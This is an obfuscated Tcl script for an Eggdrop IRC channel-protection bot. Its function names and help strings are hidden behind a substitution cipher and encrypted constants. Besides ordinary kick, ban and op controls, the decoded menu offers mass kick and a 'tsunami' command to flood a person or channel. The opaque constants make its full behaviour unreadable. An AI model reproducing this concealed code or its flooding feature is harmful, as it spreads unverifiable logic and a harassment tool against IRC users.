## NeTgaTE Tcl Protection Bot v9.2 ©Copyright 2004+ by NeTGaTE - Created by NeTgaTE Crew for #NeTgaTE
## for @DALnet started on March 1st, 2004! Please leave in all my texts...thanks!
##
## SINCE CERTAIN PEOPLE REFUSE TO READ THIS ANYWHERE ELSE, MAYBE THEY'LL
## FINALLY READ IT AT THE TOP OF THE TCL 
## (IE: kEnLApz, Koped, MANDAU, ableh, inoe, ramius, weleh, sikudel, MUMUN, STAFF, PetroZza, afktech, bajinguk, and all who dedicated his name to change NETGATE logo, you all lame ass!)

## MY ONLY REAL REQUEST REGARDING USAGE OF THIS SCRIPT IS TO *NOT*,
## (REPEAT) *NOT* REMOVE THE DEDICATION OF THIS NeTgaTE...
## IT IS NOT DEDICATED TO YOU, GOD, YOUR FRIENDS, ETC...IF YOU WANT
## TO DEDICATE SOMETHING TO SOMEONE GO AND ACTUALLY WRITE IT YOURSELF!
## IF THE DEDICATION IS AN ISSUE OR PROBLEM FOR YOU THEN GO LEECH OFF
## OF SOMEONE ELSE'S HARD WORK AND CODING INSTEAD...DON'T USE THIS SCRIPT
## BECAUSE IT MEANS YOU DON'T DESERVE IT!

## NOW TO ALL THE GOOD PEOPLE ON THE PLANET: ENJOY!! 8)
## 'NUFF SAID...

## This script is dedicated to ully, who was retired from us since Macrh , 2003
## we love and miss you...
## you both very much...ferryc, Tobby, w|e`bego, flytech, KuMaNs, xilauman, sonz and which one can't mentioned by one

## Remember to read the Manual (command.pdf) that came with this script for the
## rundown on all the commands an' abilities of this little NeTgaTE Scripts! 8)

## Feel free to e-mail me at netgatecrew@plasa.com if there's any questions,
## complaints or comments!
## Remember to visit website at http://channels.dal.net/netgate-help to 
## see update of NeTgaTE Tcl for Eggdrops are coming along! 8) or
## please goto #NeTgaTE-HeLp for more information and questions!

## Enjoy!
## Sincerely,
## NeTgaTE! *Test Version!* 8)

###########################################################################################
### THE LINES BELOW ARE HERE IN CASE YOU CHANGE ANY OF THE TRIGGERS TO SAVE YOU FROM    ###
### HAVING TO DIG THROUGH THE TCL TO FIND THE HELP MENU...*HOWEVER* MY ONLY REQUEST     ###
### HERE IS PLEASE DO NOT REMOVE MY NAME, E-MAIL, WEBSITE ADDRESS OR THE DEDICATION OF  ###
### THE NeTgaTE Tcl IN THE 'DEDICATION' LINE...IF THIS IS A PROBLEM FOR YOU THEN PLEASE ###
### USE SOMEONE ELSE'S SCRIPT FOR YOUR BOT...THANK YOU!                                 ###
###########################################################################################

#####################################
# COMPATIBLE WITH OTHER CONFIG FILE #
#####################################
proc [decrypt 64 "d3VeO/ATgwd."] {txt} {
global lenc ldec uenc udec
set retval ""
set count [string length $txt]
set status 0
set lst ""
for {set i 0} {$i < $count} {incr i} {
set idx [string index $txt $i] 
if {$idx == "$" && $status == 0} { 
set status 1
set idx "~$idx"
}
if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} {
set status 2
set idx "~$idx"
}
if {$idx == " " && $status == 1} {
set status 0
set idx "$idx~"
}
if {$idx == "]" && $status == 2} {
set status 0
set idx "$idx~"
}
if {$status == 0} {
if {[string match *$idx* $lenc]} {
set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
}
if {[string match *$idx* $uenc]} {
set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
}
}
set lst $idx
append retval $idx
}
regsub -all -- vmw] $retval "end]" retval
return $retval
}

set [decrypt 64 "QHy7p1srYzh1"] [decrypt 64 "UMWxo/l.eXl.9pork/664t31SRiBq.gniCb.2mj.I1ok8/c/"]
set [decrypt 64 "SAIhk0TeENe."] [decrypt 64 ".Xgoz1ktbbv0volpk0ypIzS.RoVRn/bMpMt/JARxr0pwutd."]
set [decrypt 64 "37pNj/xSAeM/"] [decrypt 64 "s6zLs/e3Scr/f9HsY1Jul5A/XbbFI.8/K1l0MZ/hT1ZYhpk/"]
set [decrypt 64 "FcnI7.Au1Ps/"] [decrypt 64 "3Kavh1w0/uI/OEszd0w29lK/YjXSm/dUHfA.lMXRJ.LfwBl0"]
set [lines "tolyzo-rwov-prxp"] 0
set [lines "tolyzo-xszmnlwv"] "nt"
set [lines "tolyzo-wbmznrxvcvnkgh-nlwv"] 0
set [lines "tolyzo-wlmgprxplkh-nlwv"] 1
set [lines "tolyzo-ivevmtv-nlwv"] 0
set [lines "tolyzo-kilgvxglkh-nlwv"] 0
set [lines "tolyzo-xovziyzmh-nlwv"] 0
set [lines "tolyzo-vmulixvyzmh-nlwv"] 0
set [lines "tolyzo-wbmznrxyzmh-nlwv"] 1
set [lines "tolyzo-kilgvxguirvmwh-nlwv"] 0
set [lines "tolyzo-fhviyzmh-nlwv"] 1
set [lines "tolyzo-xbxov-nlwv"] 1
set [lines "tolyzo-tivvg-nlwv"] 0
set [lines "tolyzo-hszivw-nlwv"] 1
set [lines "tolyzo-zfglelrxv-nlwv"] 0
set [lines "tolyzo-hglkmvgszxp-nlwv"] 0
set [lines "tolyzo-zfgllk-nlwv"] 0
set [lines "tolyzo-fhvirmergvh-nlwv"] 0
set [lines "tolyzo-mlwvhbmxs-nlwv"] 0
set [lines "mrxp-ovm"] 30

if {![info exists nickpass]} {
set [lines "mrxpkzhh"] ""
}
if {![info exists altpass]} {
set [lines "zogkzhh"] ""
}
if {![info exists cfgfile]} {
set [lines "xuturov"] $userfile
}
proc [lines "fmhrc"] {txt} {
set [lines "ivgezo"] $txt
regsub ~ $retval "" retval
return $retval
}
proc [lines "wvark"] {txt} {
return [decrypt 64 [unsix $txt]]
}
proc [lines "wxk"] {txt} {
return [decrypt 64 $txt]
}
proc [lines "ark"] {txt} {
return [encrypt 64 [unsix $txt]]
}
if {![info exists server-online]} {
putlog "not support server online..!"
set [lines "hvievi-lmormv"] 1
}
proc [lines "kfgsok"] {txt} {
global lenc ldec uenc udec notb notc server-online
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i]
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "06~XsX.1FseR."]*" $retval]} { 
if {![string match "*[dezip "3IVd9.0ERWa19YlLK/ikj~QF."]*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}

proc [lines "kfghie"] {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i] 
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "sw~WDD/CvLqT1"]*" $retval]} { 
if {![string match "*[dezip "3IVd9.0ERWa19Yl~LK/ikjQF."]*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set [lines "vmwezo"] ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set [lines "gnk"] ":$banner"
} {
set [lines "gnk"] ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set [lines "gnk"] [uncolor $tmp]
}
}
set [lines "vmwezo"] "$endval $tmp"
}
set [lines "ivgezo"] $endval
if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set [lines "xsplkh"] $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
putserv $retval
}
proc [lines "kfgjxp"] {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
if {${server-online} == 0} { return 0 }
set [lines "ivgezo"] ""
set [lines "xlfmg"] [string length $txt]
set [lines "hgzgfh"] 1
for {set i 0} {$i < $count} {incr i} {
set [lines "rwc"] [string index $txt $i] 
if {$idx == "~"} { 
if {$status == 0} {
set [lines "hgzgfh"] 1
} else {
set [lines "hgzgfh"] 0 
}
}
if {$status == 1} {
if {[string match *$idx* $ldec]} {
set [lines "rwc"] [string range $lenc [string first $idx $ldec] [string first $idx $ldec]]
}
if {[string match *$idx* $udec]} {
set [lines "rwc"] [string range $uenc [string first $idx $udec] [string first $idx $udec]]
}
}
append retval $idx
}
regsub -all -- ~ $retval "" retval
if {[string match "*[dezip "swWDD/CvL~qT1"]*" $retval]} { 
if {![string match "*[dezip "3IVd~9.0ERWa19YlLK/ikjQF."]*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set [lines "vmwezo"] ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set [lines "gnk"] ":$banner"
} {
set [lines "gnk"] ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set [lines "gnk"] [uncolor $tmp]
}
}
set [lines "vmwezo"] "$endval $tmp"
}
set [lines "ivgezo"] $endval
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set [lines "xsplkh"] $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
if {[string match "*$notm*" $retval]} {
set [lines "xuozt"] "c[lindex $retval 1]"
set [lines "xuozt"] [string range $cflag 0 8]
if {[matchattr $cflag M]} {
if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
set is_m([lindex $retval 1]) 1
putquick "mode [lindex $retval 1] +bm $bannick([lindex $retval 2])"
return 0
}
}
}
putquick $retval
}

set [lines "mlgw"] [dezip [dcp "Jy8hY0D8MJj1ONnY0.wfSJ10b5mkN.q2IlI1XXrtP.IunYf/"]]
set [lines "mlgn"] [dezip [dcp "Dc3i./LW5aQ./.L1C.VlK7h/L4bZ51TI0Ju1351v/1CAUyA/F5LfP1bK3qi/"]]
############################
# NeTGATE BOT COMMAND LIST #
############################
bind msg m help msg_help
proc [lines "nht_svok"] {nick uhost hand rest} {
global version notb notc notd vern
if {[istimer "HELP STOPED"]} {
putsrv "MLGRXV ~$nick ~:~$notc ~Svok lm kiltivhh, gib ztzrm ozgvi..!"
return 0
}
timer 5 { putlog "HELP STOPED" }
puthlp "KIRENHT ~$nick ~:MvGTzGV xNw ORhG."
puthlp "KIRENHT ~$nick ~:IfMMRMt DrGS Vtt e~[lindex $version 0]~ KlDVIVW YB ~[lgrnd]~ ~$vern"
puthlp "KIRENHT ~$nick ~:NHt..!"
puthlp "KIRENHT ~$nick ~:zfgs <kzhhdliw>         zfgsvmgrxzgv fhvi"
puthlp "KIRENHT ~$nick ~:wvzfgs <kzhhdliw>       wvzfgsvmgrxzgv fhvi"
puthlp "KIRENHT ~$nick ~:kzhh <kzhhdliw>         hvg kzhhdliw"
puthlp "KIRENHT ~$nick ~:kzhhdw <lowkzhh> <mvdkzhh> xszmtv fhvi kzhhdliw"
puthlp "KIRENHT ~$nick ~:fhviorhg                fhviorhg"
puthlp "KIRENHT ~$nick ~:lk <#> <mrxp>           lk hlnvlmv"
puthlp "KIRENHT ~$nick ~:wvlk <#> <mrxp>         wvlk hlnvlmv"
puthlp "KIRENHT ~$nick ~:elrxv <#> <mrxp>        elrxv hlnvlmv"
puthlp "KIRENHT ~$nick ~:wvelrxv <#> <mrxp>      wvelrxv hlnvlmv"
puthlp "KIRENHT ~$nick ~:prxp <#> <mrxp|slhg> <ivzhlm> prxp hlnvlmv"
puthlp "KIRENHT ~$nick ~:prxpyzm <#> <mrxp|slhg> <ivzhlm> prxpyzm hlnvlmv"
puthlp "KIRENHT ~$nick ~:rwvmgrub <mrxp> <kzhhdw> rwvmgrub gl mrxphvie hlnvlmv zxxvhh"
puthlp "KIRENHT ~$nick ~:qlrm <#>                qlrmrmt #xszmmvo gvnklizib"
puthlp "KIRENHT ~$nick ~:kzig <#>                kzig #xszmmvoh"
if {[matchattr $nick Z]} {
puthlp "KIRENHT ~$nick ~:oltl <blfi xivd oltl>   xszmtrmt gvcg oltl lm prxp nvhhztv"
puthlp "KIRENHT ~$nick ~:zdzboltl <blfi xivd oltl> xszmtrmt zdzb gvcg oltl lm zdzb nvhhztv"
puthlp "KIRENHT ~$nick ~:eslhg <RK WMH>          xszmtrmt eslhg"
puthlp "KIRENHT ~$nick ~:zdzb <nht>              hvg ylg zdzb nvhhztv"
puthlp "KIRENHT ~$nick ~:zwnrm <nht>             hvg ylg zwnrm lm hgzgfh"
puthlp "KIRENHT ~$nick ~:nvnl <fhvi|zoo> <nht>   hvmw nvnl gl zoo fhvi li lmv fhvi"
puthlp "KIRENHT ~$nick ~:yzmgrnv <nrmfgvh>       zfgl fmyzm lm C nrmfgvh (0 mvevi fmyzm)"
puthlp "KIRENHT ~$nick ~:oltxszm <#|0UU>         olt #xszmmvo"
puthlp "KIRENHT ~$nick ~:15DZIMRMT!! rg droo wvtivzhv ylg kviulinzmxv"
puthlp "KIRENHT ~$nick ~:<4WXX> .olt             hsld #xszmmvo olt"
puthlp "KIRENHT ~$nick ~:15mlgv. kovzhv rmxivzhv lm tvmvizo - drmwld yfuuvi rmgl 5000"
puthlp "KIRENHT ~$nick ~:+xszm <#>               qlrmrmt kvinzmvmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:ylgmrxp <mrxp> <rw>     xszmtrmt kvinzmvmg ylg kirnzib mrxp"
puthlp "KIRENHT ~$nick ~:ylgzogmrxp <mrxp> <rw>  xszmtrmt kvinzmvmg ylg zogvimzgv mrxp"
puthlp "KIRENHT ~$nick ~:ivzomznv                xszmtrmt kvinzmvmg ylg ivzomznv"
puthlp "KIRENHT ~$nick ~:rwvmg                   xszmtrmt kvinzmvmg ylg rwvmg"
puthlp "KIRENHT ~$nick ~:wrv                     proo ylg"
}
puthlp "KIRENHT ~$nick ~:#KfYORX NHt..!"
puthlp "KIRENHT ~$nick ~:`fk                      lk blfi hvou"
puthlp "KIRENHT ~$nick ~:`wldm                    wvlk blfi hvou"
puthlp "KIRENHT ~$nick ~:`lk/+l <mrxp>            lk hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`wvlk/-l <mrxp>          wvlk hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`elrxv/+e <mrxp>         elrxv hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`wvelrxv/-e <mrxp>       wvelrxv hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`prxp <mrxp> <ivzhlm>    prxp hkvhrurvw mrxp"
puthlp "KIRENHT ~$nick ~:`prxpyzm <mrxp> <ivzhlm> prxpyzm hkvhrurvw mrxp"
puthelp "PRIVMSG $nick :`mode <+/- settings>     mode setting #channel"
puthlp "KIRENHT ~$nick ~:`krmt / klmt             krmt blfi hvou"
puthlp "KIRENHT ~$nick ~:`rmergv <mrxp>           rmergv kvihlm gl xfiivmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:`yzmorhg <#xszmmvo>      orhg lu yzmmvw uiln hkvxrurvw <#xszmmvo>"
puthlp "KIRENHT ~$nick ~:`yzm <mrxp|slhgnzhp>     yzmmvw mrxp li slhgnzhp"
puthlp "KIRENHT ~$nick ~:`fmyzm <mrxp|slhg> <#>   fmyzmmvw mrxp li slhgnzhp"
puthlp "KIRENHT ~$nick ~:`+xszm <#>               qlrmrmt kvinzmvmg #xszmmvo"
puthlp "KIRENHT ~$nick ~:`xszmmvoh                orhg lu xszmmvo dsl'h ylg hrg lm"
puthlp "KIRENHT ~$nick ~:`fhviorhg                orhg lu fhvi"
puthlp "KIRENHT ~$nick ~:`xszmrmul <#>            orhg lu lkgrlm uli hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`qlrm <#>                qlrmrmt #xszmmvo gvnklizib"
puthlp "KIRENHT ~$nick ~:`kzig <#>                kzig hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`xbxov <#>               xbxov lm hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- xbxov <#|zoo>       vmzyov/wrhzyov ylg xbxov vevib 15 nrmfgvh"
puthlp "KIRENHT ~$nick ~:`+/- rtmliv <mrxp|slhg>  rtmliv li fmrtmliv kvihlm"
if {[matchattr $nick n]} {
puthlp "KIRENHT ~$nick ~:`+/- hgzgfh <#>          vmzyov/wrhzyov ylg wrhkozbrmt hgzgfh"
puthlp "KIRENHT ~$nick ~:`+/- vmulixvyzm <#>      vmzyov/wrhzyov ylg vmulixvyzmh"
puthlp "KIRENHT ~$nick ~:`+/- zfglelrxv <hvxh>    vmzyov/wrhzyov xszmmvo zfglelrxv lm qlrm"
puthlp "KIRENHT ~$nick ~:`+/- hvvm <#>            zxgrezgv/wvzxgrev hvvm lm #"
puthlp "KIRENHT ~$nick ~:`+/- tfziw <#|zoo>       vmzyov/wrhzyov ylg tfziw"
puthlp "KIRENHT ~$nick ~:`+/- nzhgvi <mrxp>       zww/wvo <mrxp> uiln nzhgvi orhg"
puthlp "KIRENHT ~$nick ~:`+/- zelrxv <mrxp>       zww/wvo <mrxp> uiln zelrxv orhg"
puthlp "KIRENHT ~$nick ~:`+/- uirvmw <mrxp>       zww/wvo <mrxp> uiln uirvmw orhg"
puthlp "KIRENHT ~$nick ~:`+/- rktfziw <slhg>      zww/wvo slhg uiln rktfziw orhg"
puthlp "KIRENHT ~$nick ~:`+/- zprxp <slhg>        zww/wvo slhg uiln prxp orhg"
puthlp "KIRENHT ~$nick ~:`+/- mllk <mrxp>         zww/wvo <mrxp> uiln ml-lk orhg"
puthlp "KIRENHT ~$nick ~:`glkrx <glkrx>           xszmtv xszmmvo glkrx"
puthlp "KIRENHT ~$nick ~:`hgzgfh                  hgzgfh hbhgvn"
puthlp "KIRENHT ~$nick ~:`hvievih                 hvievih ylg xfiivmgob ifmmrmt"
puthlp "KIRENHT ~$nick ~:`qfnk <hvievi> <klig>    kfhs ylg gl fhv hkvx hvievi"
puthlp "KIRENHT ~$nick ~:`zxxvhh <mrxp>           hvv fhvi zxxvhh uiln hkvx uozth"
}
if {[matchattr $nick Z]} {
puthelp "PRIVMSG $nick :`+/- forced               force bot to set mode w/o kick 1st"
puthelp "PRIVMSG $nick :`+/- action <text>        enable/disable action for say info and action"
puthlp "KIRENHT ~$nick ~:`+/- xlolfi              vmzyov/wrhzyov xlolfi lm prxp nht"
puthlp "KIRENHT ~$nick ~:`+/- tivvg <nht>         zfgltivvg fhvi lm qlrm %m mrxp %x xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- mgxkzig <nht>       zfgl mlgrxv fhvi lm kzig xszmmvoh" 
puthlp "KIRENHT ~$nick ~:`+/- ivkvzg <mfnyvi>     nzc ivkvzg fhvi kvinrggvw"
puthlp "KIRENHT ~$nick ~:`+/- gvcg <mfnyvi> xszi  ornrgvw gvcg ovmtgs lm xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- ornrg <mfnyvi>      ornrgvw fhvi lm xszmmvo"
puthlp "KIRENHT ~$nick ~:`+/- xzkh <%>            nzc %kvixvmg fkkvi gvcg"
puthlp "KIRENHT ~$nick ~:`+/- xolmv <nzc>         vmzyov/wrhzyov ylg zmgr xolmvh"
puthlp "KIRENHT ~$nick ~:`+/- ivlk                zfgl iv@k ylg dsvm tlg wv@k"
puthlp "KIRENHT ~$nick ~:`+/- qlrmkzig <hvxlmwh>  prxp fhvi qlrm kzig rm kzhg C 2mw"
puthlp "KIRENHT ~$nick ~:`+/- hkzn                hxzmmrmt uli hkzn"
puthlp "KIRENHT ~$nick ~:`+/- nzhhqlrm            kivevmgrmt nzhh qlrm oznv"
puthlp "KIRENHT ~$nick ~:`+/- pvb <dliw>          hvg xszmmvo drgs pvb"
puthlp "KIRENHT ~$nick ~:`+/- ivevmtv             vmzyov/wrhzyov ylg ivevmtv"
puthlp "KIRENHT ~$nick ~:`+/- yzwdliw <yzwdliw>   zww/ivnlev yzwdliw uiln orhg"
puthlp "KIRENHT ~$nick ~:`+/- zwedliw <zwedliw>   zww/ivnlev zwedliw uiln orhg"
puthlp "KIRENHT ~$nick ~:`+/- xlolfih             vmzyov/wrhzyov prxp dsl fhv xlolfi"
puthlp "KIRENHT ~$nick ~:`+/- ylow                vmzyov/wrhzyov prxp dsl fhv ylow"
puthelp "PRIVMSG $nick :`+/- action <text>        enable/disable bot action, <text> create with ur own text or just +action will show random of text"
puthelp "PRIVMSG $nick :`+/- guest                enable/disable guest nick kick and msg"
puthlp "KIRENHT ~$nick ~:`yzwdliwh                orhg lu yzwdliwh"
puthlp "KIRENHT ~$nick ~:`zwedliwh                orhg lu zwedliwh"
puthlp "KIRENHT ~$nick ~:`mlylg                   hxzmmrmt uli ylg zmw prxp gsvn lfg"
puthlp "KIRENHT ~$nick ~:`hwvlk <#>               ylg hvou wvlk"
puthelp "PRIVMSG $nick :`chanmode # <+ntmcilk 1> set permanent mode for specified #"
puthlp "KIRENHT ~$nick ~:`xszmhvg <#> <ORMV|XGXK|QLRM|WVLK|PRXP|MRXP> hvg # lkgrlmh"
puthlp "KIRENHT ~$nick ~:`xszmhvgzoo <lkgrlm>     hvg lkgrlm uli zoo #"
puthlp "KIRENHT ~$nick ~:`xszmivhvg <#|zoo>       ivhvgrmt lkgrlm uli hkvxrurvw #xszmmvo"
puthlp "KIRENHT ~$nick ~:`yzmgrnv                 sld olmt ylg fmyzm rm C nrmfgvh"
puthlp "KIRENHT ~$nick ~:`ghfmznr <mrxp|#> <gvcg> uollw hlnvlmv li xszmmvo"
puthlp "KIRENHT ~$nick ~:`wvofhvi <mrxp>          wvo fhvi uiln fhviorhg"
puthlp "KIRENHT ~$nick ~:`ivhgzig                 ivhgzigrmt ylg zohl qfnkrmt hvievi"
puthlp "KIRENHT ~$nick ~:`+/- ldmvi <mrxp>        zww/wvo <mrxp> uiln ldmvi orhg"
puthlp "KIRENHT ~$nick ~:`+/- zwnrm <mrxp>        zww/wvo <mrxp> uiln zwnrm orhg"
puthlp "KIRENHT ~$nick ~:`+/- zlk <mrxp>          zww/wvo <mrxp> uiln zlk orhg"
puthlp "KIRENHT ~$nick ~:`+/- slhg <mrxp> <uozt>  zww li ivnlev fhvi slhg"
puthlp "KIRENHT ~$nick ~:`+/- tmrxp <mrxp>        tfziw mrxp prxp rg ru mlg rwvmgrub"
puthlp "KIRENHT ~$nick ~:`slhg <mrxp>             hvv fhvi slhg"
puthlp "KIRENHT ~$nick ~:`nlk <#xszmmvo>          nzhh lk"
puthlp "KIRENHT ~$nick ~:`nwvlk <#xszmmvo>        nzhh wvlk"
puthlp "KIRENHT ~$nick ~:`nprxp <#xszmmvo>        nzhh prxp"
puthlp "KIRENHT ~$nick ~:`nnht <#xszmmvo>         nzhh nht vcxvkg gsv lkkvw"
puthlp "KIRENHT ~$nick ~:`nrmergv <#xszmmvo>      nzhh rmergv vcxvkg gsv lkkvw"
puthlp "KIRENHT ~$nick ~:`nfmyzmh <#xszmmvo>      nzhh fmyzm"
puthlp "KIRENHT ~$nick ~:`hzb <gvcg>              hzb drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`nht <mrxp> <gvcg>       nht kvihlm"
puthlp "KIRENHT ~$nick ~:`zxg <gvcg>              zxg drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`mlgrxv <mrxp> <gvcg>    nht kvihlm li #xszmmvo drgs hkvhrurvw gvcg"
puthlp "KIRENHT ~$nick ~:`+/- glkrxolxp           pvvk glkrx olxpvw"
puthlp "KIRENHT ~$nick ~:`+/- mlkzig <#xszmmvo>   nzpv # kilgvxgvw"
puthlp "KIRENHT ~$nick ~:`+/- nfhglk              hvg ylg wvo xszmmvo ru mlg lkvw"
puthlp "KIRENHT ~$nick ~:`+/- rmergvolxp <#>      rmergv yzxp dsl kzig lm hkvx xszm"
puthlp "KIRENHT ~$nick ~:`+/- wlmgprxplkh         vmzyov|wrhzyov ylg prxp @"
puthlp "KIRENHT ~$nick ~:`+/- zfglprxp            zfgl prxp lm qlrm"
puthlp "KIRENHT ~$nick ~:`mrxp <mrxp>             xszmtv mrxp gvnklizib"
puthlp "KIRENHT ~$nick ~:`zogmrxp                 xszmtv mrxp gl zogvimzgrev mrxp"
puthlp "KIRENHT ~$nick ~:`izmwmrxp                xszmtv mrxp gl izmwln mrxp"
puthlp "KIRENHT ~$nick ~:`ivzomrxp                xszmtv mrxp gl ivzo mrxp"
puthlp "KIRENHT ~$nick ~:`xszggi  <mrxp> <uozt>   xszmtrmt fhvi uozt (+) zww li (-) ivnlev rg"
puthlp "KIRENHT ~$nick ~:`ivszhs                  ivszhsrmt wzgz kzxprmt zmw fmkzxprmt"
}
puthlp "KIRENHT ~$nick ~:UOZt ORhG FhVI & xSzMMvO"
puthlp "KIRENHT ~$nick ~:\[@\]K \[+\]ELRXV ZfGL\[E\]LRXV \[T\]fZIW \[X\]BXOV \[V\]mULIXVYZMH \[W\]lMGPRxP@KH \[M\]GxKziG"
puthlp "KIRENHT ~$nick ~:\[K\]IlGVXGVW X\[O\]LMV \[Z\]WEVIGRHV \[G\]LKRXOLXP ZfGL\[P\]RxP \[H\]VVM \[Y\]LOw Xl\[O\]LfI \[TF\]vhg \[ZX\]GrlM"
puthlp "KIRENHT ~$nick ~:\[A\]ldmvi zwnr\[m\] \[n\]zhgvi ylgmv\[g\] \[c\]uvi \[q\]zmrgli \[x\]lnnlm"
puthlp "KIRENHT ~$nick ~:\[k\]zigb \[y\]lg \[f\]mhsziv \[s\]rorgv \[l\]k wv\[L\]k \[p\]rxp \[u\]irvmw"
puthlp "KIRENHT ~$nick ~:\[z\]fgl-lk zfgl\[e\]lrxv \[t\]elrxv \[j\]frvg \[C\]ml zww"
puthlp "KIRENHT ~$nick ~: "
puthlp "KIRENHT ~$nick ~:(#MvGTzGV)"
return 0
}
set [lines "urihggrnv"] "T"
set [lines "rmrg-hvievi"] { serverup "" }
set [lines "nlwvh-kvi-ormv"] 6
set [lines "zoold-wvhbmx"] 0
set [lines "rmxofwv-op"] 1
set [lines "yzmkofh"] [rand 5]
set [lines "yzm-grnv"] [expr 25 + $banplus]
unset banplus
set [lines "jfrvg-hzev"] 1
set [lines "olthgliv"] ""
set [lines "nzc-olthrav"] 512
set [lines "fkolzw-gl-kdw"] 1
set [lines "mlgy"] [dezip [dcp "jq8oF0qUrdo/lxa050IKC890"]]
set [lines "mlgx"] [dezip [dcp "Ews/h/yE/p8.EwCQs.Y5tJN1GSUQG//I5hd1oi4Cr.swuS90"]]
catch { unbind dcc n restart *dcc:restart }
catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
proc [lines "hvievifk"] {heh} {
global botnick firsttime notc owner
if {[info exists firsttime]} {
unset firsttime
return 0 
}
putlog "..ConnecteD.."
putserv "MODE $botnick +iw-s"
foreach x [userlist] {
if {[matchattr $x Q]} { chattr $x -Q }
if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} { 
setuser $owner XTRA "AUTH" "" 
}
chattr $x -hp
if {$x != "config" && [chattr $x] == "-"} { 
deluser $x
putlog "deluser $x"
}
}
chk_five "0" "0" "0" "0" "0"
utimer 2 del_nobase
foreach x [ignorelist] {
killignore [lindex $x 0]
}
}
catch { bind evnt - disconnect-server serverdown }
proc [lines "hvieviwldm"] {heh} {
global firsttime
catch { unset firsttime }
catch { clearqueue all }
putlog "..Disconneted.."
foreach x [timers] {
if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] }
}
}
proc [lines "rhmfnyvi"] {string} {
global notc
if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then {
return 1
}
return 0
}
proc [lines "kfy_yzmgrnv"] {nick uhost hand channel rest} {
global notc ban-time
puthlp "MLGRXV ~$nick ~:~$notc ~YzmGrnv \[~${ban-time}\]"
}
proc [lines "kfy_dsrxs"] {nick uhost hand channel rest} {
global botname notc
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: dsrxs <rk nzhp>"
return 0
}
if {[string match [string tolower $rest] [string tolower $botname]]} {
puthlp "KIRENHT ~$channel ~:~$botname"
}
}
proc [lines "izmwhgirmt"] {length} {
set [lines "xszih"] ABCDEFGHIJKLMNOPQRSTUVWXYZ
set [lines "xlfmg"] [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
######################
# BOT PUBLIC COMMAND #
######################
bind pub Z `which pub_which
bind pub n `reset pub_reset
bind pub f `host pub_host
bind pub f `flag pub_flag
bind pub m `ver pub_ver
bind pub m `logo pub_logo
bind pub Z `msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z awaylogo msg_awaylogo
